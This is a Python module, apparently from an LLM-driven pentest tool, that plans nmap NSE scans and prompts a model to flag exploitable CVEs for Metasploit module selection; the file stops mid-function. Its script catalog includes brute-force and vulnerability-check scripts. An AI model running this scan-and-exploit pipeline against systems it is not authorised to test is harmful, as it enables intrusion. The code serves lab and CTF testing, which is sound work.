"""
nmap_planner.py — LLM planner with RAG-informed script selection.

SAFETY NETS (because a 3B model drops data):
  - Regex extracts ports/services directly from nmap output (never misses port 80)
  - Script-to-service coherence check rejects smtp scripts on SSH ports
  - All LLM None/null fields handled defensively with _safe_dict/_safe_list

FIXES (from audit JSON):
  - CRIT-001: Regex is now FULLY AUTHORITATIVE for ports — LLM cannot add new ports
  - CRIT-002: Port-service validation rejects incoherent assignments (e.g. NetBIOS on 21)
  - CRIT-003: Regex-extracted versions always override LLM versions
  - HIGH-001: Deduplication rejects LLM ports not found by regex
  - HIGH-003: Exact version extraction from nmap output
  - HIGH-004: Improved scan methodology with service-specific script pipeline
  - MED-002: Actionable recommendations with specific commands
  - MED-004: Risk scoring based on CVSS + exploitability
  - FIX-NSE: _regex_extract_ports now parses NSE script output (http-title,
    http-server-header, fingerprint-strings) to identify web applications
    generically, enabling CVE lookups for any app nmap discovers.
"""

import json
import re
import os
from llm_client import chat as _hf_chat, LLM_MODEL, warm_up as _llm_warm_up

# ──────────────────────────────────────────────────────────────────────────────
# GENERAL-PURPOSE APP SIGNATURES — matched against NSE script output
#
# This is the SINGLE source of truth for identifying web applications from
# nmap output.  When nmap prints "http-title: Request Baskets" or
# "http-server-header: Werkzeug/2.0", these patterns turn the generic
# "Golang net/http server" into "request-baskets", which then flows through
# to NVD / Exploit-DB automatically.
#
# TO SUPPORT A NEW APP: just add one (regex, product_name) tuple here.
# No other code changes needed — the entire CVE pipeline picks it up.
# ──────────────────────────────────────────────────────────────────────────────

_NSE_APP_SIGNATURES: list[tuple[re.Pattern, str]] = [
    # ── Web applications ────────────────────────────────────────────
    (re.compile(r"request[\s\-_]?baskets?",      re.I), "request-baskets"),
    (re.compile(r"Maltrail",                     re.I), "maltrail"),
    (re.compile(r"Gitea",                        re.I), "gitea"),
    (re.compile(r"Gogs",                         re.I), "gogs"),
    (re.compile(r"Grafana",                      re.I), "grafana"),
    (re.compile(r"Prometheus",                   re.I), "prometheus"),
    (re.compile(r"Consul",                       re.I), "consul"),
    (re.compile(r"Vault",                        re.I), "hashicorp vault"),
    (re.compile(r"Nomad",                        re.I), "hashicorp nomad"),
    (re.compile(r"MinIO",                        re.I), "minio"),
    (re.compile(r"Portainer",                    re.I), "portainer"),
    (re.compile(r"Cockpit",                      re.I), "cockpit"),
    (re.compile(r"Webmin",                       re.I), "webmin"),
    (re.compile(r"phpMyAdmin",                   re.I), "phpmyadmin"),
    (re.compile(r"Adminer",                      re.I), "adminer"),
    (re.compile(r"Roundcube",                    re.I), "roundcube"),
    (re.compile(r"Nextcloud",                    re.I), "nextcloud"),
    (re.compile(r"ownCloud",                     re.I), "owncloud"),
    (re.compile(r"Drupal",                       re.I), "drupal"),
    (re.compile(r"Joomla",                       re.I), "joomla"),
    (re.compile(r"WordPress",                    re.I), "wordpress"),
    (re.compile(r"Magento",                      re.I), "magento"),
    (re.compile(r"Strapi",                       re.I), "strapi"),
    (re.compile(r"Directus",                     re.I), "directus"),
    (re.compile(r"Plone",                        re.I), "plone"),
    (re.compile(r"OpenCMS",                      re.I), "opencms"),
    (re.compile(r"Concrete\s*CMS|concrete5",     re.I), "concrete cms"),
    (re.compile(r"Grav\b",                       re.I), "grav cms"),
    (re.compile(r"Ghost\b",                      re.I), "ghost"),
    (re.compile(r"Pimcore",                      re.I), "pimcore"),
    (re.compile(r"MantisBT|Mantis\s*Bug",        re.I), "mantis bug tracker"),
    (re.compile(r"Redmine",                      re.I), "redmine"),
    (re.compile(r"Trac\b",                       re.I), "trac"),
    (re.compile(r"Kibana",                       re.I), "kibana"),
    (re.compile(r"Elasticsearch",                re.I), "elasticsearch"),
    (re.compile(r"Solr\b",                       re.I), "apache solr"),
    (re.compile(r"CouchDB",                      re.I), "couchdb"),
    (re.compile(r"RabbitMQ",                     re.I), "rabbitmq"),
    (re.compile(r"ActiveMQ",                     re.I), "apache activemq"),
    (re.compile(r"Splunk",                       re.I), "splunk"),
    (re.compile(r"Nagios",                       re.I), "nagios"),
    (re.compile(r"Zabbix",                       re.I), "zabbix"),
    (re.compile(r"Cacti\b",                      re.I), "cacti"),
    (re.compile(r"GLPI\b",                       re.I), "glpi"),
    (re.compile(r"osTicket",                     re.I), "osticket"),
    (re.compile(r"Dolibarr",                     re.I), "dolibarr"),
    (re.compile(r"SuiteCRM|SugarCRM",            re.I), "suitecrm"),
    (re.compile(r"Metabase",                     re.I), "metabase"),
    (re.compile(r"Jupyter",                      re.I), "jupyter"),
    (re.compile(r"Airflow",                      re.I), "apache airflow"),
    (re.compile(r"Jenkins",                      re.I), "jenkins"),
    (re.compile(r"TeamCity",                     re.I), "teamcity"),
    (re.compile(r"Bamboo",                       re.I), "atlassian bamboo"),
    (re.compile(r"Bitbucket",                    re.I), "atlassian bitbucket"),
    (re.compile(r"Confluence",                   re.I), "atlassian confluence"),
    (re.compile(r"Jira\b",                       re.I), "atlassian jira"),
    (re.compile(r"Artifactory",                  re.I), "jfrog artifactory"),
    (re.compile(r"Nexus\b",                      re.I), "sonatype nexus"),
    (re.compile(r"SonarQube",                    re.I), "sonarqube"),
    (re.compile(r"GitLab",                       re.I), "gitlab"),
    (re.compile(r"Phabricator",                  re.I), "phabricator"),
    (re.compile(r"Mattermost",                   re.I), "mattermost"),
    (re.compile(r"Rocket\.Chat",                 re.I), "rocket.chat"),
    (re.compile(r"Zulip",                        re.I), "zulip"),
    (re.compile(r"Discourse",                    re.I), "discourse"),
    (re.compile(r"Odoo\b",                       re.I), "odoo"),
    (re.compile(r"ERPNext",                      re.I), "erpnext"),
    (re.compile(r"LibreNMS",                     re.I), "librenms"),
    (re.compile(r"Netdata",                      re.I), "netdata"),
    (re.compile(r"Plex\b",                       re.I), "plex media server"),
    (re.compile(r"Jellyfin",                     re.I), "jellyfin"),
    (re.compile(r"Emby\b",                       re.I), "emby"),
    (re.compile(r"Bitwarden",                    re.I), "bitwarden"),
    (re.compile(r"Vaultwarden",                  re.I), "vaultwarden"),
    (re.compile(r"Keycloak",                     re.I), "keycloak"),
    (re.compile(r"Authentik",                    re.I), "authentik"),
    (re.compile(r"Authelia",                     re.I), "authelia"),
    # ── Web frameworks ──────────────────────────────────────────────
    (re.compile(r"Werkzeug",                     re.I), "werkzeug"),
    (re.compile(r"Gunicorn",                     re.I), "gunicorn"),
    (re.compile(r"Uvicorn",                      re.I), "uvicorn"),
    (re.compile(r"Tornado",                      re.I), "tornado"),
    (re.compile(r"FastAPI",                      re.I), "fastapi"),
    (re.compile(r"Flask",                        re.I), "flask"),
    (re.compile(r"Django",                       re.I), "django"),
    (re.compile(r"Express",                      re.I), "express"),
    (re.compile(r"Caddy",                        re.I), "caddy"),
    (re.compile(r"Traefik",                      re.I), "traefik"),
    (re.compile(r"Ruby on Rails|Rails/",         re.I), "ruby on rails"),
    (re.compile(r"Sinatra\b",                    re.I), "sinatra"),
    (re.compile(r"Puma\b",                       re.I), "puma"),
    (re.compile(r"Spring\b",                     re.I), "spring framework"),
    (re.compile(r"Quarkus",                      re.I), "quarkus"),
    # ── Web servers (generic — last) ────────────────────────────────
    (re.compile(r"Apache",                       re.I), "apache http server"),
    (re.compile(r"nginx",                        re.I), "nginx"),
    (re.compile(r"Microsoft-IIS|IIS/",           re.I), "microsoft iis"),
    (re.compile(r"Jetty",                        re.I), "jetty"),
    (re.compile(r"Tomcat",                       re.I), "apache tomcat"),
    (re.compile(r"lighttpd",                     re.I), "lighttpd"),
    (re.compile(r"OpenResty",                    re.I), "openresty"),
    # ── Non-HTTP services on unusual ports ──────────────────────────
    (re.compile(r"vsftpd",                       re.I), "vsftpd"),
    (re.compile(r"ProFTPD",                      re.I), "proftpd"),
    (re.compile(r"Pure-FTPd",                    re.I), "pure-ftpd"),
    (re.compile(r"OpenSSH",                      re.I), "openssh"),
]

# Services considered "generic" — these get overridden when NSE output
# reveals the real application identity.
_GENERIC_SERVICE_STRINGS = {
    "unknown", "tcpwrapped", "", "http", "https", "ssl/http",
    "ssh", "ftp", "smtp", "dns", "mysql", "rdp", "snmp", "telnet",
    "golang net/http server", "golang net/http",
}

# ──────────────────────────────────────────────────────────────────────────────
# NSE SCRIPT CATALOG + COHERENCE MAP
# ──────────────────────────────────────────────────────────────────────────────

SCRIPT_CATALOG = {
    "ssh": ["ssh-auth-methods", "ssh-hostkey", "ssh2-enum-algos"],
    "ftp": ["ftp-anon", "ftp-vsftpd-backdoor", "ftp-syst", "ftp-bounce", "ftp-brute"],
    "http": ["http-title", "http-headers", "http-methods", "http-enum",
             "http-robots.txt", "http-server-header", "http-auth-finder",
             "http-sitemap-generator", "http-shellshock", "http-sql-injection",
             "http-stored-xss", "http-csrf", "http-dombased-xss",
             "http-trace", "http-vuln-cve2017-1001000"],
    "smb": ["smb-os-discovery", "smb-enum-shares", "smb-enum-users",
            "smb-vuln-ms17-010", "smb-vuln-ms08-067", "smb-security-mode",
            "smb-vuln-regsvc-dos"],
    "smtp": ["smtp-commands", "smtp-enum-users", "smtp-open-relay"],
    "dns": ["dns-zone-transfer", "dns-recursion", "dns-brute"],
    "mysql": ["mysql-info", "mysql-enum", "mysql-brute"],
    "mssql": ["ms-sql-info", "ms-sql-ntlm-info", "ms-sql-brute"],
    "rdp": ["rdp-ntlm-info", "rdp-enum-encryption"],
    "snmp": ["snmp-info", "snmp-sysdescr", "snmp-brute"],
    "ssl": ["ssl-cert", "ssl-enum-ciphers"],
    "distcc": ["distcc-cve2004-2687"],
    "general": ["banner", "vuln"],
}

ALL_VALID_SCRIPTS = {s for scripts in SCRIPT_CATALOG.values() for s in scripts}

# Reverse map: script → service category
_SCRIPT_TO_SERVICE = {}
for _svc, _scripts in SCRIPT_CATALOG.items():
    for _s in _scripts:
        _SCRIPT_TO_SERVICE[_s] = _svc

# Keywords to detect service category from nmap version string
_SERVICE_KEYWORDS = {
    "ssh":    ("ssh", "openssh"),
    "ftp":    ("ftp", "vsftpd", "proftpd", "pure-ftpd"),
    "http":   ("http", "https", "nginx", "apache", "gunicorn", "flask", "tornado",
               "iis", "lighttpd", "jetty", "tomcat", "werkzeug", "uvicorn", "caddy",
               "golang", "express", "rails", "puma", "spring", "fastapi", "django"),
    "smb":    ("smb", "microsoft-ds", "netbios", "samba"),
    "smtp":   ("smtp", "postfix", "sendmail", "exim"),
    "dns":    ("dns", "domain", "bind"),
    "mysql":  ("mysql", "mariadb"),
    "mssql":  ("ms-sql", "mssql"),
    "rdp":    ("rdp", "ms-wbt-server"),
    "snmp":   ("snmp",),
    "ssl":    ("ssl", "tls"),
    "distcc": ("distcc", "distccd"),
}

# Well-known port → service (fallback when service string is "unknown")
_PORT_TO_SERVICE = {
    21: "ftp", 22: "ssh", 25: "smtp", 53: "dns", 80: "http", 110: "pop3",
    139: "smb", 143: "imap", 443: "http", 445: "smb", 1433: "mssql",
    3306: "mysql", 3389: "rdp", 3632: "distcc",
    8080: "http", 8443: "http", 8000: "http",
    8008: "http", 8888: "http", 9090: "http", 3000: "http", 5000: "http",
}

# ──────────────────────────────────────────────────────────────────────────────
# CRIT-002 FIX: Port-service coherence validation
# ──────────────────────────────────────────────────────────────────────────────

_PORT_EXPECTED_SERVICE = {
    1:    ("tcpmux",),
    2:    ("compressnet",),
    13:   ("daytime",),
    17:   ("qotd",),
    19:   ("chargen",),
    20:   ("ftp-data",),
    21:   ("ftp", "vsftpd", "proftpd", "pure-ftpd"),
    22:   ("ssh", "openssh"),
    23:   ("telnet",),
    25:   ("smtp", "postfix", "sendmail", "exim"),
    53:   ("dns", "domain", "bind"),
    80:   ("http", "nginx", "apache", "iis", "tomcat", "lighttpd"),
    88:   ("kerberos",),
    110:  ("pop3",),
    123:  ("ntp",),
    139:  ("netbios", "smb", "samba", "microsoft-ds"),
    143:  ("imap",),
    161:  ("snmp",),
    443:  ("http", "ssl", "nginx", "apache", "iis"),
    445:  ("netbios", "smb", "samba", "microsoft-ds"),
    1433: ("ms-sql", "mssql"),
    3306: ("mysql", "mariadb"),
    3389: ("rdp", "ms-wbt"),
    3632: ("distcc", "distccd"),
    5432: ("postgres",),
    6379: ("redis",),
    8080: ("http", "nginx", "apache", "tomcat", "proxy"),
    8443: ("http", "ssl", "nginx", "apache"),
    27017: ("mongo",),
}


def _validate_port_service(port: int, service_str: str) -> bool:
    """
    CRIT-002 FIX: Validate that a service string is coherent with the port number.
    Returns True if the service is plausible for this port, False if it's fabricated.
    """
    if not service_str or service_str.lower() in ("unknown", ""):
        return True  # unknown is always acceptable

    expected = _PORT_EXPECTED_SERVICE.get(port)
    if expected is None:
        return True  # non-standard port, we can't validate

    svc_lower = service_str.lower()
    return any(kw in svc_lower for kw in expected)


def _detect_service_category(service_str: str, port: int) -> str | None:
    svc_lower = service_str.lower()
    for category, keywords in _SERVICE_KEYWORDS.items():
        for kw in keywords:
            if kw in svc_lower:
                return category
    return _PORT_TO_SERVICE.get(port)


def validate_scripts(scripts: list[str]) -> list[str]:
    """Filter to scripts in catalog AND on disk."""
    valid = []
    for s in scripts:
        s = s.strip().lower()
        if s in ALL_VALID_SCRIPTS:
            if s in ("vuln", "safe", "default", "discovery") or \
               os.path.exists(f"/usr/share/nmap/scripts/{s}.nse"):
                valid.append(s)
    return valid


def validate_scripts_for_port(scripts: list[str], service_str: str, port: int) -> list[str]:
    """
    BUG 2 FIX: Reject scripts that don't match the service on this port.
    Prevents: smtp-enum-users on port 22 (SSH), mysql-enum on port 80 (HTTP).
    """
    port_category = _detect_service_category(service_str, port)
    coherent = []
    for s in scripts:
        script_category = _SCRIPT_TO_SERVICE.get(s)
        if script_category is None:
            coherent.append(s)
        elif script_category == "general":
            coherent.append(s)
        elif script_category == port_category:
            coherent.append(s)
        else:
            print(f"  ⚠  Rejected {s} ({script_category}) on port {port} ({port_category or service_str})")
    return coherent


# ──────────────────────────────────────────────────────────────────────────────
# SYSTEM PROMPTS
# ──────────────────────────────────────────────────────────────────────────────

PLANNER_SYSTEM = """\
You are an expert penetration tester in an authorized HTB lab.

YOUR JOB: Decide which NSE scripts to run on which ports.
You output structured JSON. The system builds the nmap commands.

The scan results tell you exactly which service runs on which port — use that
to decide which scripts belong on which port. Each script should target the port
where the relevant service was found open.

ALREADY COMPLETED (never repeat): full TCP -p-, -sV -O.

RULES:
1. Respond ONLY with valid JSON.
2. Maximum 4 steps per round.
3. SYN-confirmed open ports are ground truth. If an NSE step returns a port as
   filtered, this is a scan timing artifact — retry on the same or alternative
   port (e.g. 139 instead of 445 for SMB) with different scripts; do NOT skip it.
4. Never repeat scripts already run on a port.
5. If all services fully enumerated → pentest_complete: true.
6. "firewall" must be a JSON object {}, never null.
7. Use the NSE script documentation provided in context to choose scripts and
   prioritise those that reveal version, OS, or known vulnerabilities.

FORMAT:
{
  "analysis": "Brief reasoning",
  "steps": [
    {"id": 1, "label": "Name", "scan_type": "nse_scripts", "port": 80,
     "scripts": ["http-title", "http-enum"], "reason": "why"}
  ],
  "pentest_complete": false
}

scan_type: "nse_scripts" | "udp_scan" | "vuln_scan"."""


EXPLOIT_PLANNER_SYSTEM = """\
You are a penetration tester in an authorized HTB lab. Based on verified scan \
evidence, identify which vulnerabilities are exploitable on this target.

Your job is CVE and service identification — a separate RAG-based module \
selector will choose the specific Metasploit module using its documentation. \
Do NOT name a specific module path.

Output ONLY a JSON array (nothing else). Each element:
{
  "cve":              "CVE-YYYY-NNNNN or null if no CVE is confirmed",
  "severity":         "CRITICAL|HIGH|MEDIUM|LOW",
  "title":            "Short description of the vulnerability or attack surface",
  "port":             <integer port where the vulnerable service was found>,
  "detected_service": "service string from the scan"
}

RULES:
- Ground truth is the scan evidence. Do NOT invent services, versions, or OS.
- Include a finding when there is DIRECT evidence from the scan (NSE output,
  NVD CVEs, searchsploit matches, banners, version strings, risky methods).
- "cve" MAY be null when the evidence is a condition rather than a named CVE
  (e.g. WebDAV PUT allowed on IIS, anonymous FTP, exposed CGI, default creds).
  A null-CVE entry is still actionable — the module selector uses the service
  and evidence to find the right exploit.
- Sort by severity (CRITICAL first). Maximum 5 entries.
- If nothing is clearly exploitable from the evidence, return [].
- Return ONLY the JSON array. No prose, no markdown fences."""


ANALYZER_SYSTEM = """\
You are a security analyst. Extract findings from nmap output as JSON.

CRITICAL — PRESERVE FULL VERSION STRINGS:
  "22": "OpenSSH 8.2p1 Ubuntu 4ubuntu0.7" NOT just "ssh"

CRITICAL — INCLUDE ALL OPEN PORTS. Missing a port is a critical error.

CRITICAL — DO NOT INVENT PORTS. Only include ports that appear as "X/tcp open" in the output.
  Port numbers are the FIRST number on lines like "21/tcp open ftp".
  Line numbers or row numbers are NOT port numbers.

RULES:
- open_ports: ONLY state "open". Never "closed"/"filtered".
- filtered_ports: ONLY explicit "filtered" in SYN/-sV. Never "open|filtered".
- services keys: port number only ("22", not "22/tcp").
- firewall: must be {} object, NEVER null.

FORMAT:
{
  "open_ports": [22, 80],
  "filtered_ports": [],
  "services": {"22": "OpenSSH 8.2p1 Ubuntu 4ubuntu0.7", "80": "nginx 1.18.0"},
  "os_hint": "Linux 5.4",
  "firewall": {"detected": false, "type": "unknown"},
  "nmap_cves": [],
  "interesting_findings": [],
  "suggested_followups": []
}"""


INSIGHT_SYSTEM = """\
You are a penetration tester interpreting fresh NSE script results mid-scan.

Given what the scripts just revealed, write 2-4 concise sentences that answer:
1. What new information does this add about the target? (versions, services, vulns, misconfigs)
2. Does anything stand out as exploitable or unexpected?
3. What should be prioritised next based on this?

Rules:
- If results are routine and add nothing new, say so in one sentence.
- Never repeat data verbatim — interpret and contextualise it.
- Never invent ports or services not in the data.
- Focus on actionable insight for a penetration tester."""


REPORT_SYSTEM = """\
You are a security analyst writing a pentest report. Use ONLY the data provided.
Never invent services, ports, or versions. If data missing → "Not determined".

CRITICAL RULES:
1. ONLY mention ports listed in OPEN PORTS. Do NOT mention any other port numbers.
2. Use the EXACT service names and versions provided. Do NOT change them.
3. Assess attack surface based on:
   - Number of RCE vulnerabilities → HIGH if any RCE exists
   - Known backdoors (vsftpd 2.3.4) → CRITICAL
   - Anonymous/unauthenticated access → increases severity
   - Multiple attack vectors → HIGH
4. Recommendations must be SPECIFIC and ACTIONABLE:
   - Include exact CVE IDs when available
   - Include specific tool commands (e.g., Metasploit module names)
   - Prioritize by severity (CRITICAL first)
5. If backdoors or trivial RCE exist, the attack surface is HIGH or CRITICAL, never "moderate".
6. OS-MATCHING RULE (critical): NEVER recommend Windows exploits (EternalBlue, MS08-067,
   ms17_010, ms08_067, windows/smb/*, windows/meterpreter) when the target OS is Linux/Unix.
   NEVER recommend Linux/Unix exploits when the target is Windows.
   If OS is unknown, only recommend cross-platform exploits.
   Samba on Linux is NOT Windows SMB — use exploit/multi/samba/* not exploit/windows/smb/*.
7. Use the KNOWN RISK INDICATORS provided verbatim — do not add exploits not listed there."""


# ──────────────────────────────────────────────────────────────────────────────
# PLANNER CLASS
# ──────────────────────────────────────────────────────────────────────────────

class NmapPlanner:

    def __init__(self, model: str = LLM_MODEL):
        self.model = model
        self.accumulated_findings: list[dict] = []
        self._total_steps = 0
        self._scripted: dict[int, set[str]] = {}
        self._rag_index = None

    @property
    def step_counter(self): return self._total_steps

    def set_rag_index(self, index): self._rag_index = index

    @property
    def rag_available(self):
        return self._rag_index is not None and len(self._rag_index) > 0

    def register_scripts_run(self, port: int, scripts: list[str]):
        if port not in self._scripted: self._scripted[port] = set()
        self._scripted[port].update(scripts)

    def get_scripts_run(self, port: int) -> set[str]:
        return self._scripted.get(port, set())

    def warm_up(self) -> None:
        """Pre-load LLM weights before any timed scan step begins."""
        _llm_warm_up()

    # ── Safe accessors (handles LLM returning null/None) ──────────

    @staticmethod
    def _safe_dict(val) -> dict:
        return val if isinstance(val, dict) else {}

    @staticmethod
    def _safe_list(val) -> list:
        return val if isinstance(val, list) else []

    @staticmethod
    def _safe_str(val) -> str:
        if isinstance(val, str): return val
        return str(val) if val is not None else ""

    @staticmethod
    def _clean_port(port) -> int | None:
        try: return int(str(port).replace("/tcp", "").replace("/udp", "").strip())
        except (ValueError, TypeError): return None

    # ── LLM interface ─────────────────────────────────────────────

    def _call_llm(self, system, user_msg, max_tokens: int = 1024):
        return _hf_chat(
            messages=[{"role": "system", "content": system},
                      {"role": "user", "content": user_msg}],
            model=self.model,
            temperature=0.3,
            max_tokens=max_tokens,
        )

    def _parse_json(self, text):
        text = re.sub(r"```(?:json)?\s*", "", text).replace("```", "").strip()
        try: return json.loads(text)
        except json.JSONDecodeError: pass
        start, end = text.find("{"), text.rfind("}")
        if start != -1 and end > start:
            try: return json.loads(text[start:end+1])
            except json.JSONDecodeError: pass
        return {}

    # ── Findings consolidation (fully None-safe) ──────────────────

    def _consolidated_findings(self) -> dict:
        all_ports: dict[int, str] = {}
        filtered_candidates: set[int] = set()
        interesting, followups, os_hints = [], [], []
        firewall: dict = {}

        for f in self.accumulated_findings:
            for port in self._safe_list(f.get("open_ports")):
                p = self._clean_port(port)
                if p is None: continue
                svc = (self._safe_dict(f.get("services")).get(str(p))
                       or self._safe_dict(f.get("services")).get(f"{p}/tcp") or "unknown")
                if svc and svc.lower() not in ("unknown", "") and (
                    p not in all_ports or len(svc) > len(all_ports.get(p, ""))
                ):
                    all_ports[p] = svc

            for pk, svc in self._safe_dict(f.get("services")).items():
                p = self._clean_port(pk)
                if p is None: continue
                incoming = self._safe_str(svc).strip()
                current = all_ports.get(p, "")
                if not current or current.lower() in ("unknown", "ssh", "http", "ftp", ""):
                    if incoming and incoming.lower() not in ("unknown", ""):
                        all_ports[p] = incoming
                elif len(incoming) > len(current):
                    all_ports[p] = incoming

            for port in self._safe_list(f.get("filtered_ports")):
                p = self._clean_port(port)
                if p is not None: filtered_candidates.add(p)

            oh = self._safe_str(f.get("os_hint"))
            if oh and oh.lower() not in ("unknown", ""): os_hints.append(oh)

            fw = self._safe_dict(f.get("firewall"))
            if fw.get("detected") is not None: firewall = fw

            for item in self._safe_list(f.get("interesting_findings")):
                if item and item not in interesting: interesting.append(item)
            for item in self._safe_list(f.get("suggested_followups")):
                if item and item not in followups: followups.append(item)

        return {
            "open_ports":           sorted(all_ports.keys()),
            "filtered_ports":       sorted(filtered_candidates - set(all_ports.keys())),
            "services":             {str(p): s for p, s in sorted(all_ports.items())},
            "os_hint":              os_hints[-1] if os_hints else "unknown",
            "firewall":             firewall,
            "interesting_findings": interesting[:30],
            "suggested_followups":  followups[:15],
        }

    # ── RAG-informed plan creation ────────────────────────────────

    def create_plan(self, target_ip: str, objective: str = "",
                    syn_confirmed: "set | None" = None,
                    searchsploit_hits: "dict | None" = None) -> dict:
        consolidated = self._consolidated_findings()
        open_ports = consolidated["open_ports"]
        if not open_ports:
            return {"steps": [], "pentest_complete": True, "analysis": "No open ports."}

        filtered = consolidated.get("filtered_ports", [])
        filtered_str = ", ".join(str(p) for p in filtered) if filtered else "None"

        # SYN-confirmed ports are the authoritative ground truth.  Communicate
        # this explicitly so the LLM does not give up on a port that appeared
        # filtered only in a later NSE or version-detection step.
        if syn_confirmed:
            syn_str = ", ".join(str(p) for p in sorted(syn_confirmed))
        else:
            syn_str = ", ".join(str(p) for p in open_ports) if open_ports else "unknown"

        port_status = []
        for p in open_ports:
            svc = consolidated["services"].get(str(p), "unknown")
            already = sorted(self.get_scripts_run(p))
            s = f"  Port {p}: {svc}"
            s += f"\n    Scripts done: {', '.join(already)}" if already else "\n    No scripts yet"
            port_status.append(s)

        rag_context = ""
        if self.rag_available:
            try:
                from nmap_rag import retrieve_for_services
                rag_context = retrieve_for_services(
                    services=consolidated["services"], index=self._rag_index,
                    findings=consolidated.get("interesting_findings"), top_n_per_service=4)
                _RAG_CHAR_LIMIT = 2500
                if len(rag_context) > _RAG_CHAR_LIMIT:
                    rag_context = rag_context[:_RAG_CHAR_LIMIT] + "\n...(truncated)"
            except Exception as e:
                rag_context = f"(RAG failed: {e})"

        # Searchsploit context: show the LLM what the local exploit DB has
        # for detected services so it can prioritise the right vuln scripts.
        ssp_block = ""
        if searchsploit_hits:
            lines = []
            for label, entries in sorted(searchsploit_hits.items()):
                for e in (entries or [])[:3]:
                    title = (e.get("Title") or "")[:65]
                    etype = (e.get("Type") or "")
                    lines.append(f"  [{label}] EDB-{e.get('EDB-ID','?')}: {title}  [{etype}]")
            if lines:
                ssp_block = ("\nSEARCHSPLOIT (local exploit DB matches for detected services"
                             " — use as evidence when choosing vuln scripts):\n"
                             + "\n".join(lines) + "\n")

        fw = self._safe_dict(consolidated.get("firewall"))
        user_msg = f"""\
Target: {target_ip}
Objective: {objective or "Full reconnaissance"}

SYN-CONFIRMED OPEN PORTS (authoritative — if a later NSE step returns \
filtered for any of these, it is a timing artifact on the remote host; \
retry on the same or alternative port rather than skipping it):
  {syn_str}

DO NOT scan (truly filtered/closed, absent from SYN results): {filtered_str}

SERVICES:
{chr(10).join(port_status)}

FINDINGS: {json.dumps(consolidated.get("interesting_findings", [])[:15], ensure_ascii=False)}
OS: {consolidated.get("os_hint", "unknown")}
Firewall: {json.dumps(fw, ensure_ascii=False)}
{ssp_block}
{rag_context}
DONE: TCP -p-, -sV -O. Plan NSE scripts for each open service.
If all services are fully enumerated → pentest_complete: true."""

        raw = self._call_llm(PLANNER_SYSTEM, user_msg)
        plan = self._parse_json(raw)
        if not plan or "steps" not in plan:
            plan = self._fallback_plan(consolidated)
        plan["steps"] = self._validate_steps(
            plan.get("steps", []), consolidated, syn_confirmed=syn_confirmed
        )
        return plan

    def _validate_steps(self, steps, consolidated,
                        syn_confirmed: "set | None" = None) -> list[dict]:
        open_set     = set(consolidated["open_ports"])
        filtered_set = set(consolidated.get("filtered_ports", []))
        services     = consolidated.get("services", {})
        valid        = []

        for step in self._safe_list(steps)[:4]:
            if not isinstance(step, dict): continue
            scan_type = step.get("scan_type", "nse_scripts")
            if scan_type == "udp_scan":
                valid.append(step); continue

            port = step.get("port")
            if port is not None: port = self._clean_port(port)
            if port is not None:
                # A SYN-confirmed open port is authoritative regardless of what
                # later scan types (NSE -sV, ACK -sA) report.  Without this,
                # a Phase 3 NSE step that gets a timing-artifact "filtered" on
                # an SMB port would cause all subsequent planning rounds to
                # skip that port, even though it is genuinely open.
                in_syn       = syn_confirmed is not None and port in syn_confirmed
                in_open      = port in open_set and port not in filtered_set
                if not (in_syn or in_open):
                    print(f"  ⚠  Rejected step on port {port} (not confirmed open)")
                    continue

            scripts = self._safe_list(step.get("scripts"))
            if scripts:
                scripts = validate_scripts(scripts)
                if port is not None:
                    svc_str = services.get(str(port), "unknown")
                    scripts = validate_scripts_for_port(scripts, svc_str, port)
                    already = self.get_scripts_run(port)
                    scripts = [s for s in scripts if s not in already]
                if not scripts: continue
                step["scripts"] = scripts

            if port is not None: step["port"] = port
            valid.append(step)
        return valid

    def _fallback_plan(self, consolidated) -> dict:
        """
        HIGH-004 FIX: Deterministic fallback with proper service-specific scripts.
        """
        open_ports = consolidated["open_ports"]
        services = consolidated["services"]
        filtered = set(consolidated.get("filtered_ports", []))
        steps = []

        for p in open_ports:
            if p in filtered: continue
            svc = services.get(str(p), "").lower()
            already = self.get_scripts_run(p)
            cat = _detect_service_category(svc, p)

            script_map = {
                "ssh":    ["ssh-auth-methods", "ssh-hostkey", "ssh2-enum-algos"],
                "ftp":    ["ftp-anon", "ftp-vsftpd-backdoor", "ftp-syst"],
                "http":   ["http-title", "http-headers", "http-methods", "http-enum"],
                "smb":    ["smb-os-discovery", "smb-enum-shares", "smb-security-mode",
                           "smb-vuln-ms17-010"],
                "smtp":   ["smtp-commands", "smtp-enum-users"],
                "distcc": ["distcc-cve2004-2687"],
            }
            if cat in script_map:
                scripts = [s for s in script_map[cat] if s not in already]
                if scripts:
                    steps.append({"id": len(steps)+1, "label": f"{cat.upper()} enum port {p}",
                                  "scan_type": "nse_scripts", "port": p, "scripts": scripts,
                                  "reason": f"Fallback: {cat} enumeration"})

        steps.append({"id": len(steps)+1, "label": "UDP scan top 50",
                       "scan_type": "udp_scan", "reason": "UDP not yet scanned"})
        return {"analysis": "Deterministic fallback.", "steps": steps[:4], "pentest_complete": False}

    # ── Regex safety net + LLM analysis ───────────────────────────

    @staticmethod
    def _regex_extract_ports(nmap_output: str) -> dict:
        """
        Deterministic port/service extraction. NEVER misses a port.

        CRIT-001 FIX: This is the AUTHORITATIVE source for ports and services.

        PASS 1: Parse port table lines.
        PASS 2: Parse NSE script output generically — capture http-title,
                http-server-header, and all script lines per port.  When NSE
                reveals a more specific identity than the port table gave
                (e.g. http-title shows the real app name), upgrade the service.
                No hardcoded signature list — works for any application.
        """
        open_ports, filtered_ports, services = [], [], {}
        nse_meta: dict[int, dict] = {}

        # ── PASS 1: Parse port table lines ────────────────────────────
        for line in nmap_output.splitlines():
            line = line.strip()
            m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
            if m:
                port = int(m.group(1))
                open_ports.append(port)
                svc_detail = m.group(3).strip()
                services[str(port)] = svc_detail if svc_detail else m.group(2)
                continue
            m = re.match(r"(\d+)/tcp\s+filtered\s+\S+", line)
            if m:
                filtered_ports.append(int(m.group(1)))
                continue
            m = re.match(r"(\d+)/udp\s+open\s+(\S+)\s*(.*)", line)
            if m:
                port = int(m.group(1))
                open_ports.append(port)
                svc_detail = m.group(3).strip()
                services[str(port)] = svc_detail if svc_detail else m.group(2)

        # ── PASS 2: Parse NSE script output generically ───────────────
        current_port: int | None = None
        _port_header_re = re.compile(r"^(\d+)/(?:tcp|udp)\s+open\s+")
        _nse_title_re   = re.compile(r"^\|\s*http-title:\s*(.+)", re.I)
        _nse_server_re  = re.compile(r"^\|\s*http-server-header:\s*(.+)", re.I)
        _nse_line_re    = re.compile(r"^\|[\s_](.+)")

        for line in nmap_output.splitlines():
            stripped = line.strip()

            m_port = _port_header_re.match(stripped)
